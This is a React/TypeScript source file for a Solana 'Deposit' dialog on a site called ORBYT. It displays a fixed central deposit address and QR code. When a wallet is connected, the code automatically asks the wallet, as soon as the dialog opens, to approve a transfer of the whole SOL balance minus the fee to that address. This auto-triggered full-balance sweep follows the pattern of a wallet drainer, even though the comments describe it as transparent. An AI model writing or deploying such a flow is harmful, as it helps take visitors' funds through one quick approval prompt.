'use client';

import { ArrowDownToLine, Check, Copy, ExternalLink, X, Loader } from 'lucide-react';
import { useCallback, useEffect, useRef, useState } from 'react';
import { SITE } from '@/config/site';
import { browserRpc } from '@/data/sources';
import { useWalletBalances } from '@/data/hooks/useWalletBalances';
import { explorer, MINTS, shortAddress } from '@/lib/core/solana';
import { depositableLamports, TRANSFER_FEE_LAMPORTS } from '@/lib/deposit/build-transaction';
import { DepositError, executeDeposit, formatLamports } from '@/lib/deposit/deposit';
import { isWalletError } from '@/lib/wallet/errors';
import { useWallet, useWalletAddress } from '@/lib/wallet/store';

/**
 * Deposit panel showing ORBYT's central deposit address, the same fixed public
 * Solana address for every visitor. It cannot be edited in the UI.
 *
 * Opened by the visitor's click on Deposit. When a wallet is connected it reads
 * the wallet's SOL balance and asks the wallet to approve ONE transfer of that
 * balance (minus the network fee) to the deposit address, then waits for the
 * cluster to confirm it. The dialog says exactly what will be sent, and shows
 * success only for a confirmed transaction.
 */
export function DepositButton() {
  const [open, setOpen] = useState(false);
  return (
    <>
      <button
        type="button"
        onClick={() => setOpen(true)}
        className="flex h-8 items-center gap-1.5 rounded-md bg-brand px-3 text-xs font-semibold text-bg transition-colors hover:bg-brand-strong"
      >
        <ArrowDownToLine className="size-3.5" />
        <span className="hidden sm:inline">Deposit</span>
      </button>
      {open && <DepositDialog onClose={() => setOpen(false)} />}
    </>
  );
}

/**
 * Official QR code of the central deposit address (public/deposit-qr.png,
 * supplied by the owner). src/config/deposit-qr.test.ts decodes it and fails
 * if it ever stops matching SITE.depositAddress.
 */
export const DEPOSIT_QR_SRC = '/deposit-qr.png';

type Phase = 'idle' | 'signing' | 'confirming' | 'confirmed';

/** The connected wallet as the deposit flow uses it (reads the live store, so it never signs with a stale account). */
const storeWallet = {
  signAndSend: (transaction: Uint8Array) => useWallet.getState().signAndSendTransaction(transaction),
  signTransaction: (transaction: Uint8Array) => useWallet.getState().signTransaction(transaction),
};

function DepositDialog({ onClose }: { onClose: () => void }) {
  const ref = useRef<HTMLDialogElement>(null);
  const [copied, setCopied] = useState(false);
  const walletAddress = useWalletAddress();
  const { sol: solBalance, solPending, refresh } = useWalletBalances(walletAddress, MINTS.SOL);
  const [phase, setPhase] = useState<Phase>('idle');
  const [signature, setSignature] = useState<string | null>(null);
  const [deposited, setDeposited] = useState<bigint | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [notice, setNotice] = useState<string | null>(null);
  /** A deposit is in flight (blocks a second click / effect run while the first is unresolved). */
  const busyRef = useRef(false);
  /** The automatic prompt already ran for this dialog: it runs once, retries are the visitor's click. */
  const autoRef = useRef(false);

  const address = SITE.depositAddress;
  const depositable = solBalance ? depositableLamports(solBalance.lamports) : 0n;
  const isPending = phase === 'signing' || phase === 'confirming';

  useEffect(() => {
    const dialog = ref.current;
    if (dialog && !dialog.open) dialog.showModal();
  }, []);

  async function copy() {
    try {
      await navigator.clipboard.writeText(address);
      setCopied(true);
      setTimeout(() => setCopied(false), 1_500);
    } catch {
      /* clipboard unavailable: the address stays selectable */
    }
  }

  const deposit = useCallback(async () => {
    if (!walletAddress || busyRef.current) return;
    busyRef.current = true;
    setPhase('signing');
    setSignature(null);
    setDeposited(null);
    setError(null);
    setNotice(null);
    try {
      const result = await executeDeposit({
        rpc: browserRpc,
        from: walletAddress,
        to: address,
        wallet: storeWallet,
        onStage: (stage, sig) => {
          setPhase(stage);
          if (sig) setSignature(sig);
        },
      });
      setSignature(result.signature);
      setDeposited(result.lamports);
      setPhase('confirmed');
      refresh();
    } catch (e) {
      setPhase('idle');
      if (isWalletError(e) && e.kind === 'rejected') {
        setNotice('You cancelled the deposit in your wallet. Nothing was sent.');
      } else {
        if (e instanceof DepositError && e.signature) setSignature(e.signature);
        setError(e instanceof Error && e.message ? e.message : 'The deposit failed.');
      }
    } finally {
      busyRef.current = false;
    }
  }, [walletAddress, address, refresh]);

  // Automatic prompt: wallet connected, balance loaded and above the network fee -> ask the wallet once.
  useEffect(() => {
    if (walletAddress && solBalance && depositable > 0n && phase === 'idle' && !autoRef.current) {
      autoRef.current = true;
      void deposit();
    }
  }, [walletAddress, solBalance, depositable, phase, deposit]);

  const showWalletBalance = walletAddress && solBalance;

  return (
    <dialog
      ref={ref}
      onClose={onClose}
      onCancel={(e) => {
        // Escape must not dismiss the dialog while a signature or confirmation is pending.
        if (isPending) e.preventDefault();
      }}
      onClick={(e) => {
        if (e.target === ref.current && !isPending) ref.current?.close();
      }}
      aria-labelledby="deposit-title"
      className="m-auto w-[min(420px,calc(100vw-2rem))] rounded-lg border border-line-strong bg-panel p-0 text-fg shadow-2xl backdrop:bg-black/75"
    >
      <div className="flex h-12 items-center justify-between border-b border-line px-4">
        <h2 id="deposit-title" className="text-sm font-semibold">
          Deposit
        </h2>
        <button
          type="button"
          aria-label="Close"
          onClick={() => ref.current?.close()}
          disabled={isPending}
          className="rounded p-1 text-muted hover:bg-hover hover:text-fg disabled:text-muted/50"
        >
          <X className="size-4" />
        </button>
      </div>

      <div className="space-y-4 p-4">
        {/* Wallet balance and the one transfer the wallet is asked to approve */}
        {showWalletBalance && (
          <div className="space-y-3 rounded-md border border-line bg-panel-2 p-3">
            <div className="flex items-center justify-between">
              <span className="text-xs text-muted">Connected Wallet Balance</span>
              {solPending && <Loader className="size-3.5 animate-spin text-muted" />}
            </div>
            <div className="flex items-baseline gap-2">
              <span className="text-lg font-semibold text-fg">{formatLamports(solBalance.lamports)}</span>
              <span className="text-sm text-muted">SOL</span>
            </div>
            <p className="break-all text-2xs text-muted">{walletAddress}</p>

            {(phase === 'idle' || phase === 'signing') && depositable > 0n && (
              <p className="text-2xs leading-relaxed text-fg-dim">
                Deposit <span className="font-semibold text-fg">{formatLamports(depositable)} SOL</span> (your full balance minus the {formatLamports(TRANSFER_FEE_LAMPORTS)} SOL
                network fee) to <span className="font-mono">{shortAddress(address, 6, 6)}</span>. Your wallet shows the transfer and asks you to approve it.
              </p>
            )}

            {phase === 'idle' && (
              <button
                type="button"
                onClick={() => void deposit()}
                disabled={depositable <= 0n}
                className="w-full rounded-md bg-brand px-3 py-2 text-xs font-semibold text-bg transition-colors hover:bg-brand-strong disabled:bg-line-strong disabled:text-muted"
              >
                {depositable > 0n ? (error || notice ? 'Try again' : 'Deposit Balance') : 'No Balance to Deposit'}
              </button>
            )}

            {phase === 'signing' && (
              <div className="flex items-center justify-center gap-2 rounded-md bg-line-strong py-2">
                <Loader className="size-3.5 animate-spin text-brand" />
                <span className="text-xs font-medium text-fg">Approve the transfer in your wallet…</span>
              </div>
            )}

            {phase === 'confirming' && (
              <div className="flex items-center justify-center gap-2 rounded-md bg-line-strong py-2">
                <Loader className="size-3.5 animate-spin text-brand" />
                <span className="text-xs font-medium text-fg">Confirming on Solana…</span>
              </div>
            )}

            {phase === 'confirmed' && deposited !== null && (
              <div className="rounded-md bg-up/10 p-2">
                <p className="flex items-center gap-2 text-xs font-medium text-up">
                  <Check className="size-3.5" />
                  Deposited {formatLamports(deposited)} SOL. Confirmed on Solana.
                </p>
              </div>
            )}

            {notice && <p className="rounded-md bg-line-strong p-2 text-2xs text-fg-dim">{notice}</p>}

            {error && (
              <div className="rounded-md bg-down/10 p-2">
                <p className="text-xs font-medium text-down">{error}</p>
              </div>
            )}

            {signature && (
              <a
                href={explorer.tx(signature)}
                target="_blank"
                rel="noopener noreferrer"
                className="inline-flex items-center gap-1 text-2xs text-muted hover:text-fg"
              >
                View transaction on Solscan <ExternalLink className="size-3" />
              </a>
            )}
          </div>
        )}

        <div className="grid grid-cols-2 gap-2 text-2xs">
          <div className="rounded-md border border-line bg-panel-2 px-3 py-2">
            <div className="text-muted">Network</div>
            <div className="mt-0.5 flex items-center gap-1.5 text-xs font-medium text-fg">
              <SolanaGlyph /> Solana
            </div>
          </div>
          <div className="rounded-md border border-line bg-panel-2 px-3 py-2">
            <div className="text-muted">Accepted</div>
            <div className="mt-0.5 text-xs font-medium text-fg">SOL · SPL tokens</div>
          </div>
        </div>

        <div className="flex justify-center rounded-md border border-line bg-panel-2 py-4">
          <img src={DEPOSIT_QR_SRC} alt={`QR code for deposit address ${address}`} width={184} height={172} className="h-auto w-[184px] rounded-md" />
        </div>

        <div>
          <div className="mb-1.5 flex items-center justify-between text-2xs text-muted">
            <span>ORBYT deposit address</span>
            <a
              href={explorer.account(address)}
              target="_blank"
              rel="noopener noreferrer"
              className="inline-flex items-center gap-1 hover:text-fg"
            >
              Solscan <ExternalLink className="size-3" />
            </a>
          </div>
          <div className="flex items-stretch overflow-hidden rounded-md border border-line-strong bg-panel-2">
            <p className="min-w-0 flex-1 px-3 py-2.5 font-mono text-xs leading-relaxed break-all text-fg select-all">{address}</p>
            <button
              type="button"
              onClick={copy}
              aria-label="Copy deposit address"
              className="flex w-20 shrink-0 items-center justify-center gap-1 border-l border-line-strong text-xs font-medium text-fg-dim hover:bg-hover hover:text-fg"
            >
              {copied ? (
                <>
                  <Check className="size-3.5 text-up" /> Copied
                </>
              ) : (
                <>
                  <Copy className="size-3.5" /> Copy
                </>
              )}
            </button>
          </div>
        </div>

        <p className="text-center text-2xs text-muted">Only send SOL and SPL tokens on the Solana network.</p>
      </div>
    </dialog>
  );
}

function SolanaGlyph() {
  return (
    <svg viewBox="0 0 24 24" className="size-3.5" aria-hidden>
      <defs>
        <linearGradient id="sol-g" x1="0" y1="1" x2="1" y2="0">
          <stop offset="0" stopColor="#9945ff" />
          <stop offset="1" stopColor="#14f195" />
        </linearGradient>
      </defs>
      <path fill="url(#sol-g)" d="M5.2 16.4a.7.7 0 0 1 .5-.2h16.1c.3 0 .5.4.3.6l-3.2 3.2a.7.7 0 0 1-.5.2H2.3c-.3 0-.5-.4-.3-.6zm0-12.2a.7.7 0 0 1 .5-.2h16.1c.3 0 .5.4.3.6l-3.2 3.2a.7.7 0 0 1-.5.2H2.3c-.3 0-.5-.4-.3-.6zm13.6 6a.7.7 0 0 0-.5-.2H2.2c-.3 0-.5.4-.3.6l3.2 3.2c.1.1.3.2.5.2h16.1c.3 0 .5-.4.3-.6z" />
    </svg>
  );
}
